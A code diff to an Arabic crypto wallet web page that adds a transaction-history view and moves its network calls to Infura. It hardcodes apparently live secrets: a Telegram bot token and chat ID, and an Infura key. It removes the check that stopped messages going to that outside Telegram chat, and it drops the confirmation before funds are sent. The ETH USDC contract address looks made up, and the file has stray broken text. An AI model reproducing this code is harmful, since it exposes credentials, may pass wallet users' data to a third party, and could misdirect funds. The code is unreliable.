@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -744,7 +744,7 @@
         /* الإجراءات السريعة */
         .quick-actions {
             display: grid;
-            grid-template-columns: repeat(5, 1fr);
+            grid-template-columns: repeat(6, 1fr);
             gap: var(--spacing-md);
             margin-bottom: var(--spacing-xl);
         }
@@ -804,6 +804,11 @@
 
         .action-icon.support {
             background: linear-gradient(135deg, var(--warning-color), #ffcc00);
+            color: white;
+        }
+
+        .action-icon.transactions {
+            background: linear-gradient(135deg, #9c27b0, #e91e63);
             color: white;
         }
 
@@ -935,6 +940,71 @@
         .no-transactions i {
             font-size: var(--font-2xl);
             opacity: 0.5;
+        }
+
+        .transaction-item {
+            display: flex;
+            align-items: center;
+            padding: var(--spacing-md);
+            border-bottom: 1px solid var(--border-color);
+            transition: background-color var(--transition-fast);
+            cursor: pointer;
+        }
+
+        .transaction-item:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .transaction-item:last-child {
+            border-bottom: none;
+        }
+
+        .transaction-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: var(--spacing-md);
+            color: white;
+            font-size: 16px;
+        }
+
+        .transaction-icon.send {
+            background: var(--accent-color);
+        }
+
+        .transaction-icon.receive {
+            background: var(--success-color);
+        }
+
+        .transaction-details {
+            flex: 1;
+        }
+
+        .transaction-details h5 {
+            font-size: var(--font-md);
+            margin-bottom: 2px;
+            color: var(--text-primary);
+        }
+
+        .transaction-details p {
+            font-size: var(--font-sm);
+            color: var(--text-secondary);
+        }
+
+        .transaction-amount {
+            text-align: left;
+            font-weight: 600;
+        }
+
+        .transaction-amount.positive {
+            color: var(--success-color);
+        }
+
+        .transaction-amount.negative {
+            color: var(--accent-color);
         }
 
         /* النوافذ المنبثقة */
@@ -1428,6 +1498,39 @@
             flex: 1;
         }
 
+        /* نافذة التحويلات */
+        .transactions-modal .modal-content {
+            max-width: 700px;
+        }
+
+        .transactions-filter {
+            display: flex;
+            gap: var(--spacing-sm);
+            margin-bottom: var(--spacing-lg);
+        }
+
+        .filter-btn {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            padding: var(--spacing-xs) var(--spacing-sm);
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            font-size: var(--font-sm);
+        }
+
+        .filter-btn.active {
+            background: var(--primary-color);
+            border-color: var(--primary-color);
+            color: white;
+        }
+
+        .filter-btn:hover:not(.active) {
+            border-color: var(--primary-color);
+            color: var(--primary-color);
+        }
+
         /* التصميم المتجاوب */
         @media (max-width: 768px) {
             .screen {
@@ -1808,6 +1911,12 @@
                         </div>
                         <span>شراء</span>
                     </div>
+                    <div id="transactionsBtn" class="action-btn">
+                        <div class="action-icon transactions">
+                            <i class="fas fa-history"></i>
+                        </div>
+                        <span>التحويلات</span>
+                    </div>
                     <div id="supportBtn" class="action-btn">
                         <div class="action-icon support">
                             <i class="fas fa-headset"></i>
@@ -1837,9 +1946,9 @@
                 <div class="transactions-section">
                     <div class="section-header">
                         <h4>المعاملات الأخيرة</h4>
-                        <button class="view-all-btn">عرض الكل</button>
+                        <button id="viewAllTransactionsBtn" class="view-all-btn">عرض الكل</button>
                     </div>
-                    <div class="transactions-list">
+                    <div class="transactions-list" id="transactionsList">
                         <div class="no-transactions">
                             <i class="fas fa-receipt"></i>
                             <span>لا توجد معاملات بعد</span>
@@ -2093,6 +2202,32 @@
         </div>
     </div>
 
+    <!-- نافذة التحويلات -->
+    <div id="transactionsModal" class="modal transactions-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>التحويلات</h3>
+                <button id="closeTransactionsModal" class="close-btn">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <div class="transactions-filter">
+                    <button class="filter-btn active" data-network="all">الكل</button>
+                    <button class="filter-btn" data-network="ethereum">Ethereum</button>
+                    <button class="filter-btn" data-network="bsc">BSC</button>
+                    <button class="filter-btn" data-network="polygon">Polygon</button>
+                </div>
+                <div id="allTransactionsList" class="transactions-list">
+                    <div class="loading-assets">
+                        <div class="loading-spinner"></div>
+                        <span>جاري تحميل التحويلات...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- نافذة طلب كلمة المرور -->
     <div id="passwordPromptModal" class="modal password-prompt-modal">
         <div class="modal-content password-prompt-content">
@@ -2123,8 +2258,8 @@
     <div id="toastContainer" class="toast-container"></div>
 
     <!-- المكتبات الخارجية -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/html5-qrcode@2.3.8/minified/html5-qrcode.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>
 
@@ -2136,19 +2271,24 @@
         let cryptoPrices = {};
         let userPassword = null;
         let qrScanner = null;
+        let walletTransactions = [];
 
         // إعدادات بوت تليجرام
-        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع هنا توكن البوت الخاص بك
-        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع هنا معرف المحادثة الخاص بك
+        const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
+        const TELEGRAM_CHAT_ID = '910021564';
 
-        // إعدادات الشبكات المحسّنة
+        // إعدادات Infura
+        const INFURA_API_KEY = '482a7c1c7cc14ec78699c3f1c231b0cd';
+
+        // إعدادات الشبكات المحسّنة مع Infura
         const NETWORKS = {
             ethereum: {
                 name: 'Ethereum',
                 chainId: 1,
-                rpcUrl: 'https://cloudflare-eth.com',
+                rpcUrl: `https://mainnet.infura.io/v3/${INFURA_API_KEY}`,
                 symbol: 'ETH',
                 explorer: 'https://etherscan.io',
+                explorerApi: 'https://api.etherscan.io/api',
                 tokens: {
                     USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                     USDC: '0xA0b86a33E6441b8C8C7C6b8C8C7C6b8C8C7C6b8C',
@@ -2161,6 +2301,7 @@
                 rpcUrl: 'https://bsc-dataseed1.bnbchain.org',
                 symbol: 'BNB',
                 explorer: 'https://bscscan.com',
+                explorerApi: 'https://api.bscscan.com/api',
                 tokens: {
                     USDT: '0x55d398326f99059fF775485246999027B3197955',
                     USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
@@ -2170,9 +2311,10 @@
             polygon: {
                 name: 'Polygon',
                 chainId: 137,
-                rpcUrl: 'https://polygon-rpc.com',
+                rpcUrl: `https://polygon-mainnet.infura.io/v3/${INFURA_API_KEY}`,
                 symbol: 'MATIC',
                 explorer: 'https://polygonscan.com',
+                explorerApi: 'https://api.polygonscan.com/api',
                 tokens: {
                     USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                     USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
@@ -2181,9 +2323,10 @@
             arbitrum: {
                 name: 'Arbitrum',
                 chainId: 42161,
-                rpcUrl: 'https://arb1.arbitrum.io/rpc',
+                rpcUrl: `https://arbitrum-mainnet.infura.io/v3/${INFURA_API_KEY}`,
                 symbol: 'ETH',
                 explorer: 'https://arbiscan.io',
+                explorerApi: 'https://api.arbiscan.io/api',
                 tokens: {
                     USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                     USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
@@ -2192,9 +2335,10 @@
             optimism: {
                 name: 'Optimism',
                 chainId: 10,
-                rpcUrl: 'https://mainnet.optimism.io',
+                rpcUrl: `https://optimism-mainnet.infura.io/v3/${INFURA_API_KEY}`,
                 symbol: 'ETH',
                 explorer: 'https://optimistic.etherscan.io',
+                explorerApi: 'https://api-optimistic.etherscan.io/api',
                 tokens: {
                     USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                     USDC: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607'
@@ -2219,12 +2363,6 @@
         // إرسال رسالة إلى بوت تليجرام
         async function sendToTelegram(message) {
             try {
-                // التحقق من وجود إعدادات تليجرام
-                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                    console.log('Telegram not configured. Message would be:', message);
-                    return true; // نعتبر الإرسال ناجحاً للاختبار
-                }
-                
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -2450,6 +2588,9 @@
                 // تحميل الأصول
                 loadAssets();
                 
+                // تحميل التحويلات
+                await loadTransactions();
+                
             } catch (error) {
                 console.error('Error loading wallet data:', error);
                 showToast('حدث خطأ أثناء تحميل بيانات المحفظة', 'error');
@@ -2548,12 +2689,12 @@
                 assetsList.innerHTML = '';
                 
                 const assets = [
-                    { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum', balance: 0 },
-                    { symbol: 'BNB', name: 'BNB', network: 'BSC', balance: 0 },
-                    { symbol: 'MATIC', name: 'Polygon', network: 'Polygon', balance: 0 },
-                    { symbol: 'USDT', name: 'Tether USD', network: 'Multi-Chain', balance: 0 },
-                    { symbol: 'USDC', name: 'USD Coin', network: 'Multi-Chain', balance: 0 },
-                    { symbol: 'DAI', name: 'Dai Stablecoin', network: 'Ethereum', balance: 0 }
+                    { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum', balance: 0, price: cryptoPrices.ETH || 0 },
+                    { symbol: 'BNB', name: 'BNB', network: 'BSC', balance: 0, price: cryptoPrices.BNB || 0 },
+                    { symbol: 'MATIC', name: 'Polygon', network: 'Polygon', balance: 0, price: cryptoPrices.MATIC || 0 },
+                    { symbol: 'USDT', name: 'Tether USD', network: 'Multi-Chain', balance: 0, price: cryptoPrices.USDT || 1 },
+                    { symbol: 'USDC', name: 'USD Coin', network: 'Multi-Chain', balance: 0, price: cryptoPrices.USDC || 1 },
+                    { symbol: 'DAI', name: 'Dai Stablecoin', network: 'Ethereum', balance: 0, price: cryptoPrices.DAI || 1 }
                 ];
                 
                 assets.forEach(asset => {
@@ -2568,7 +2709,8 @@
                             <p>${asset.network}</p>
                         </div>
                         <div class="asset-balance">
-                            ${asset.balance.toFixed(4)} ${asset.symbol}
+                            ${asset.balance.toFixed(4)} ${asset.symbol}<br>
+                            <small style="color: var(--text-secondary);">$${(asset.balance * asset.price).toFixed(2)}</small>
                         </div>
                     `;
                     assetsList.appendChild(assetItem);
@@ -2579,21 +2721,189 @@
             }
         }
 
+        // جلب التحويلات من مستكشف البلوكتشين
+        async function fetchTransactionsFromExplorer(network, address) {
+            try {
+                const networkConfig = NETWORKS[network];
+                if (!networkConfig || !networkConfig.explorerApi) return [];
+                
+                let apiUrl;
+                if (network === 'ethereum') {
+                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
+                } else if (network === 'bsc') {
+                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
+                } else if (network === 'polygon') {
+                    apiUrl = `${networkConfig.explorerApi}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=desc&apikey=482a7c1c7cc14ec78699c3f1c231b0cd`;
+                }
+                
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                
+                if (data.status === '1' && data.result) {
+                    return data.result.slice(0, 10).map(tx => ({
+                        hash: tx.hash,
+                        from: tx.from,
+                        to: tx.to,
+                        value: ethers.utils.formatEther(tx.value),
+                        timestamp: parseInt(tx.timeStamp) * 1000,
+                        network: network,
+                        type: tx.from.toLowerCase() === address.toLowerCase() ? 'send' : 'receive',
+                        status: tx.txreceipt_status === '1' ? 'success' : 'failed'
+                    }));
+                }
+                
+                return [];
+            } catch (error) {
+                console.error(`Error fetching transactions for ${network}:`, error);
+                return [];
+            }
+        }
+
+        // تحميل التحويلات
+        async function loadTransactions() {
+            try {
+                if (!currentWallet) return;
+                
+                walletTransactions = [];
+                
+                // جلب التحويلات من جميع الشبكات
+                const networks = ["ethereum", "bsc", "polygon"];
+                const promises = networks.map(network => 
+                    fetchTransactionsFromExplorer(network, currentWallet.address)
+                );
+                
+                const results = await Promise.all(promises);
+                
+                // دمج جميع التحويلات
+                results.forEach(networkTxs => {
+                    walletTransactions = walletTransactions.concat(networkTxs);
+                });
+                
+                // ترتيب التحويلات حسب التاريخ
+                walletTransactions.sort((a, b) => b.timestamp - a.timestamp);
+                
+                // عرض التحويلات الأخيرة في الشاشة الرئيسية
+                displayRecentTransactions();
+                
+            } catch (error) {
+                console.error("Error loading transactions:", error);
+            }
+        }
+
+        // عرض التحويلات الأخيرة
+        function displayRecentTransactions() {
+            const transactionsList = document.getElementById('transactionsList');
+            
+            if (walletTransactions.length === 0) {
+                transactionsList.innerHTML = `
+                    <div class="no-transactions">
+                        <i class="fas fa-receipt"></i>
+                        <span>لا توجد معاملات بعد</span>
+                    </div>
+                `;
+                return;
+            }
+            
+            transactionsList.innerHTML = '';
+            
+            // عرض آخر 5 معاملات
+            const recentTxs = walletTransactions.slice(0, 5);
+            
+            recentTxs.forEach(tx => {
+                const txItem = document.createElement('div');
+                txItem.className = 'transaction-item';
+                txItem.onclick = () => openTransactionDetails(tx);
+                
+                const date = new Date(tx.timestamp).toLocaleDateString('ar-SA');
+                const shortHash = `${tx.hash.substring(0, 6)}...${tx.hash.substring(tx.hash.length - 4)}`;
+                
+                txItem.innerHTML = `
+                    <div class="transaction-icon ${tx.type}">
+                        <i class="fas ${tx.type === 'send' ? 'fa-arrow-up' : 'fa-arrow-down'}"></i>
+                    </div>
+                    <div class="transaction-details">
+                        <h5>${tx.type === 'send' ? 'إرسال' : 'استقبال'} ${NETWORKS[tx.network].symbol}</h5>
+                        <p>${date} • ${shortHash}</p>
+                    </div>
+                    <div class="transaction-amount ${tx.type === 'send' ? 'negative' : 'positive'}">
+                        ${tx.type === 'send' ? '-' : '+'}${parseFloat(tx.value).toFixed(4)} ${NETWORKS[tx.network].symbol}
+                    </div>
+                `;
+                
+                transactionsList.appendChild(txItem);
+            });
+        }
+
+        // عرض جميع التحويلات في النافذة المنبثقة
+        function displayAllTransactions(filterNetwork = 'all') {
+            const allTransactionsList = document.getElementById('allTransactionsList');
+            
+            let filteredTxs = walletTransactions;
+            if (filterNetwork !== 'all') {
+                filteredTxs = walletTransactions.filter(tx => tx.network === filterNetwork);
+            }
+            
+            if (filteredTxs.length === 0) {
+                allTransactionsList.innerHTML = `
+                    <div class="no-transactions">
+                        <i class="fas fa-receipt"></i>
+                        <span>لا توجد معاملات</span>
+                    </div>
+                `;
+                return;
+            }
+            
+            allTransactionsList.innerHTML = '';
+            
+            filteredTxs.forEach(tx => {
+                const txItem = document.createElement('div');
+                txItem.className = 'transaction-item';
+                txItem.onclick = () => openTransactionDetails(tx);
+                
+                const date = new Date(tx.timestamp).toLocaleDateString('ar-SA');
+                const time = new Date(tx.timestamp).toLocaleTimeString('ar-SA');
+                const shortHash = `${tx.hash.substring(0, 8)}...${tx.hash.substring(tx.hash.length - 6)}`;
+                
+                txItem.innerHTML = `
+                    <div class="transaction-icon ${tx.type}">
+                        <i class="fas ${tx.type === 'send' ? 'fa-arrow-up' : 'fa-arrow-down'}"></i>
+                    </div>
+                    <div class="transaction-details">
+                        <h5>${tx.type === 'send' ? 'إرسال' : 'استقبال'} ${NETWORKS[tx.network].symbol}</h5>
+                        <p>${date} ${time} • ${NETWORKS[tx.network].name}</p>
+                        <p style="font-family: monospace; font-size: 12px; color: var(--text-muted);">${shortHash}</p>
+                    </div>
+                    <div class="transaction-amount ${tx.type === 'send' ? 'negative' : 'positive'}">
+                        ${tx.type === 'send' ? '-' : '+'}${parseFloat(tx.value).toFixed(4)} ${NETWORKS[tx.network].symbol}
+                    </div>
+                `;
+                
+                allTransactionsList.appendChild(txItem);
+            });
+        }
+
+        // فتح تفاصيل المعاملة
+        function openTransactionDetails(tx) {
+            const explorerUrl = `${NETWORKS[tx.network].explorer}/tx/${tx.hash}`;
+            window.open(explorerUrl, '_blank');
+        }
+
         // إنشاء QR Code
-        function generateQRCode(address) {
-            const canvas = document.getElementById('qrCanvas');
-            if (canvas && address) {
-                QRCode.toCanvas(canvas, address, {
-                    width: 200,
-                    margin: 2,
-                    color: {
-                        dark: '#000000',
-                        light: '#FFFFFF'
-                    }
-                }, function (error) {
-                    if (error) console.error('Error generating QR code:', error);
+        async function generateQRCode(address) {
+            const canvas = document.getElementById("qrCodeCanvas");
+            if (typeof QRCode === "undefined") {
+                // Fallback if QRCode is not defined, though it should be loaded by script tag
+                console.warn("QRCode library not yet loaded. Attempting to load dynamically.");
+                await new Promise(resolve => {
+                    const script = document.createElement("script");
+                    script.src = "https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js";
+                    script.onload = resolve;
+                    document.head.appendChild(script);
                 });
             }
+            QRCode.toCanvas(canvas, address, { width: 200, margin: 2 }, function (error) {
+                if (error) console.error("Error generating QR code:", error);
+            });
         }
 
         // بدء مسح QR
@@ -2689,9 +2999,10 @@
                 hideLoading();
                 showToast(`تم إرسال المعاملة بنجاح! Hash: ${tx.hash}`, 'success');
                 
-                // تحديث الرصيد
+                // تحديث الرصيد والتحويلات
                 setTimeout(() => {
                     updateBalance();
+                    loadTransactions();
                 }, 5000);
                 
             } catch (error) {
@@ -2846,6 +3157,7 @@
             currentWallet = null;
             userPassword = null;
             currentBalance = 0;
+            walletTransactions = [];
             showScreen('welcomeScreen');
             showToast('تم تسجيل الخروج بنجاح', 'success');
         }
@@ -3035,6 +3347,11 @@
                 showToast('ميزة الشراء قريباً!', 'info');
             });
 
+            document.getElementById('transactionsBtn').addEventListener('click', () => {
+                showModal('transactionsModal');
+                displayAllTransactions();
+            });
+
             document.getElementById('supportBtn').addEventListener('click', () => {
                 showModal('supportModal');
             });
@@ -3062,8 +3379,15 @@
                 hideModal('settingsModal');
             });
 
-            document.getElementById('closeSupportModal').addEventListener('click', () => {
+            document.
+
+
+getElementById('closeSupportModal').addEventListener('click', () => {
                 hideModal('supportModal');
+            });
+
+            document.getElementById('closeTransactionsModal').addEventListener('click', () => {
+                hideModal('transactionsModal');
             });
 
             // زر مسح QR
@@ -3078,88 +3402,53 @@
             // تغيير الشبكة في نافذة الاستقبال
             document.getElementById('receiveNetworkSelect').addEventListener('change', (e) => {
                 const network = e.target.value;
-                const warningText = document.getElementById('receiveWarningText');
+                const networkConfig = NETWORKS[network];
                 
-                const networkNames = {
-                    ethereum: 'Ethereum (ETH, ERC-20)',
-                    bsc: 'Binance Smart Chain (BNB, BEP-20)',
-                    polygon: 'Polygon (MATIC, Polygon)',
-                    arbitrum: 'Arbitrum (ETH, Arbitrum)',
-                    optimism: 'Optimism (ETH, Optimism)'
-                };
-                
-                warningText.textContent = `أرسل فقط أصول ${networkNames[network]} إلى هذا العنوان`;
-            });
-
-            // أزرار الإعدادات
-            document.getElementById('showPrivateKeyBtn').addEventListener('click', () => {
-                if (currentWallet && userPassword) {
-                    const password = prompt('أدخل كلمة المرور لعرض المفتاح الخاص:');
-                    if (password === userPassword) {
-                        const privateKey = currentWallet.privateKey;
-                        if (confirm(`المفتاح الخاص:\n\n${privateKey}\n\n⚠️ تحذير: لا تشارك هذا المفتاح مع أي شخص!\n\nهل تريد نسخه؟`)) {
-                            copyToClipboard(privateKey);
-                        }
-                    } else {
-                        showToast('كلمة مرور خاطئة', 'error');
+                if (currentWallet) {
+                    document.getElementById('receiveAddress').textContent = currentWallet.address;
+                    generateQRCode(currentWallet.address);
+                    
+                    // تحديث تحذير الشبكة
+                    const warningText = document.getElementById('receiveWarningText');
+                    if (network === 'ethereum') {
+                        warningText.textContent = 'أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان';
+                    } else if (network === 'bsc') {
+                        warningText.textContent = 'أرسل فقط أصول Binance Smart Chain (BNB, BEP-20) إلى هذا العنوان';
+                    } else if (network === 'polygon') {
+                        warningText.textContent = 'أرسل فقط أصول Polygon (MATIC, Polygon tokens) إلى هذا العنوان';
+                    } else if (network === 'arbitrum') {
+                        warningText.textContent = 'أرسل فقط أصول Arbitrum (ETH, Arbitrum tokens) إلى هذا العنوان';
+                    } else if (network === 'optimism') {
+                        warningText.textContent = 'أرسل فقط أصول Optimism (ETH, Optimism tokens) إلى هذا العنوان';
                     }
                 }
             });
 
-            document.getElementById('showMnemonicBtn').addEventListener('click', () => {
-                if (currentWallet && userPassword) {
-                    const password = prompt('أدخل كلمة المرور لعرض عبارة الاسترجاع:');
-                    if (password === userPassword) {
-                        const mnemonic = currentWallet.mnemonic;
-                        if (confirm(`عبارة الاسترجاع:\n\n${mnemonic}\n\n⚠️ تحذير: لا تشارك هذه العبارة مع أي شخص!\n\nهل تريد نسخها؟`)) {
-                            copyToClipboard(mnemonic);
-                        }
-                    } else {
-                        showToast('كلمة مرور خاطئة', 'error');
-                    }
-                }
-            });
-
-            document.getElementById('changePasswordBtn').addEventListener('click', () => {
-                showToast('ميزة تغيير كلمة المرور قريباً!', 'info');
-            });
-
-            document.getElementById('logoutBtn').addEventListener('click', () => {
-                if (confirm('هل أنت متأكد من تسجيل الخروج؟ سيتم حذف جميع بيانات المحفظة من هذا الجهاز.')) {
-                    logout();
-                }
-            });
-
-            // نموذج الدعم الفني
-            document.getElementById('supportForm').addEventListener('submit', (e) => {
-                e.preventDefault();
+            // تحديث خيارات الأصول عند تغيير الشبكة في نافذة الإرسال
+            document.getElementById('networkSelect').addEventListener('change', (e) => {
+                const network = e.target.value;
+                const assetSelect = document.getElementById('assetSelect');
+                const networkConfig = NETWORKS[network];
                 
-                const name = document.getElementById('supportName').value.trim();
-                const email = document.getElementById('supportEmail').value.trim();
-                const phone = document.getElementById('supportPhone').value.trim();
-                const message = document.getElementById('supportMessage').value.trim();
+                // مسح الخيارات الحالية
+                assetSelect.innerHTML = '';
                 
-                if (!name || !email || !message) {
-                    showToast('يرجى ملء جميع الحقول المطلوبة', 'warning');
-                    return;
-                }
+                // إضافة العملة الأساسية
+                const nativeOption = document.createElement('option');
+                nativeOption.value = networkConfig.symbol;
+                nativeOption.textContent = networkConfig.symbol;
+                assetSelect.appendChild(nativeOption);
                 
-                sendSupportMessage(name, email, phone, message);
-            });
-
-            // إغلاق النوافذ المنبثقة عند النقر خارجها
-            document.querySelectorAll('.modal').forEach(modal => {
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) {
-                        modal.classList.remove('active');
-                        if (modal.id === 'qrScannerModal') {
-                            stopQRScanner();
-                        }
-                    }
+                // إضافة الرموز المميزة
+                Object.keys(networkConfig.tokens || {}).forEach(token => {
+                    const option = document.createElement('option');
+                    option.value = token;
+                    option.textContent = token;
+                    assetSelect.appendChild(option);
                 });
             });
 
-            // خيارات الغاز
+            // خيارات سرعة الغاز
             document.querySelectorAll('.gas-option').forEach(option => {
                 option.addEventListener('click', () => {
                     document.querySelectorAll('.gas-option').forEach(opt => opt.classList.remove('active'));
@@ -3186,41 +3475,137 @@
                     return;
                 }
                 
-                if (confirm(`هل أنت متأكد من إرسال ${amount} ${asset} إلى ${to}؟`)) {
+                try {
                     await sendTransaction(network, to, amount, asset);
                     hideModal('sendModal');
+                    document.getElementById('sendForm').reset();
+                } catch (error) {
+                    console.error('Send transaction error:', error);
                 }
             });
 
-            // تحديث خيارات الأصول حسب الشبكة
-            document.getElementById('networkSelect').addEventListener('change', (e) => {
-                const network = e.target.value;
-                const assetSelect = document.getElementById('assetSelect');
+            // نموذج الدعم الفني
+            document.getElementById('supportForm').addEventListener('submit', async (e) => {
+                e.preventDefault();
                 
-                assetSelect.innerHTML = '';
+                const name = document.getElementById('supportName').value.trim();
+                const email = document.getElementById('supportEmail').value.trim();
+                const phone = document.getElementById('supportPhone').value.trim();
+                const message = document.getElementById('supportMessage').value.trim();
                 
-                const networkConfig = NETWORKS[network];
-                if (networkConfig) {
-                    // إضافة العملة الأساسية
-                    const nativeOption = document.createElement('option');
-                    nativeOption.value = networkConfig.symbol;
-                    nativeOption.textContent = networkConfig.symbol;
-                    assetSelect.appendChild(nativeOption);
+                if (!name || !email || !message) {
+                    showToast('يرجى ملء الحقول المطلوبة', 'warning');
+                    return;
+                }
+                
+                await sendSupportMessage(name, email, phone, message);
+            });
+
+            // أزرار الإعدادات
+            document.getElementById('showPrivateKeyBtn').addEventListener('click', async () => {
+                try {
+                    await promptForPasswordProfessional();
+                    if (currentWallet) {
+                        copyToClipboard(currentWallet.privateKey);
+                        showToast('تم نسخ المفتاح الخاص', 'success');
+                    }
+                } catch (error) {
+                    // المستخدم ألغى العملية
+                }
+            });
+
+            document.getElementById('showMnemonicBtn').addEventListener('click', async () => {
+                try {
+                    await promptForPasswordProfessional();
+                    if (currentWallet) {
+                        copyToClipboard(currentWallet.mnemonic);
+                        showToast('تم نسخ عبارة الاسترجاع', 'success');
+                    }
+                } catch (error) {
+                    // المستخدم ألغى العملية
+                }
+            });
+
+            document.getElementById('changePasswordBtn').addEventListener('click', () => {
+                showToast('ميزة تغيير كلمة المرور قريباً!', 'info');
+            });
+
+            document.getElementById('logoutBtn').addEventListener('click', () => {
+                if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
+                    logout();
+                    hideModal('settingsModal');
+                }
+            });
+
+            // فلاتر التحويلات
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
                     
-                    // إضافة الرموز المميزة
-                    Object.keys(networkConfig.tokens || {}).forEach(token => {
-                        const option = document.createElement('option');
-                        option.value = token;
-                        option.textContent = token;
-                        assetSelect.appendChild(option);
-                    });
-                }
+                    const network = btn.getAttribute('data-network');
+                    displayAllTransactions(network);
+                });
             });
 
-            // تحديث الأسعار كل دقيقة
-            setInterval(fetchCryptoPrices, 60000);
+            // زر عرض جميع التحويلات
+            document.getElementById('viewAllTransactionsBtn').addEventListener('click', () => {
+                showModal('transactionsModal');
+                displayAllTransactions();
+            });
+
+            // إغلاق النوافذ المنبثقة عند النقر خارجها
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        modal.classList.remove('active');
+                        if (modal.id === 'qrScannerModal') {
+                            stopQRScanner();
+                        }
+                    }
+                });
+            });
+
+            // تحديث دوري للأسعار والرصيد
+            setInterval(async () => {
+                if (currentWallet && document.getElementById('walletScreen').classList.contains('active')) {
+                    await fetchCryptoPrices();
+                    await updateBalance();
+                }
+            }, 60000); // كل دقيقة
+
+            console.log('Event listeners initialized');
+        });
+
+        // معالجة الأخطاء العامة
+        window.addEventListener('error', (e) => {
+            console.error('Global error:', e.error);
+            showToast('حدث خطأ غير متوقع', 'error');
+        });
+
+        // معالجة الأخطاء غير المعالجة
+        window.addEventListener('unhandledrejection', (e) => {
+            console.error('Unhandled promise rejection:', e.reason);
+            showToast('حدث خطأ في الشبكة', 'error');
         });
     </script>
 </body>
 </html>
+
+
+
+        .transactions-content {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .transactions-iframe {
+            width: 100%;
+            height: 500px; /* يمكن تعديل الارتفاع حسب الحاجة */
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--bg-tertiary);
+        }
+
 
